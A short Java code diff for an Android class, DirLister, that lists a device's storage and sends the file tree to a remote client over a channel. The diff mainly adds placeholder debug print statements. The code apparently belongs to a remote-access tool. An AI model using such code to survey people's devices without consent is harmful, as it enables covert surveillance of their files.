@@ -14,18 +14,30 @@ public class DirLister {
 	
 	public static boolean listDir(ClientListener c, int channel, String dirname) {
 		File f;
-		ArrayList<MyFile> ar = new ArrayList<MyFile>();
-		
-		if(dirname.equals("/"))
+		ArrayList<MyFile> ar = new ArrayList<>();
+		System.out.println("DIRRRRRRRRRRRRRRR"+dirname);
+		if(dirname.equals("/")){
+			System.out.println("aaaaa");
 			f = Environment.getExternalStorageDirectory();
-		else
+		}
+		else{
+			System.out.println("bbbbb");
 			f = new File(dirname);
+		}
 		
 		if (!f.exists()) {
+			System.out.println("ccccc");
 			return false;
 		} 
 		else {
+			System.out.println("eeeee");
 			ar.add(visitAllDirsAndFiles(f));
+
+			System.out.println(ar.size());
+			System.out.println(ar.toString());
+			for (MyFile myFile : ar) {
+				System.out.println(myFile.name);
+			}
 			c.handleData(channel, new FileTreePacket(ar).build());
 			return true;
 		}
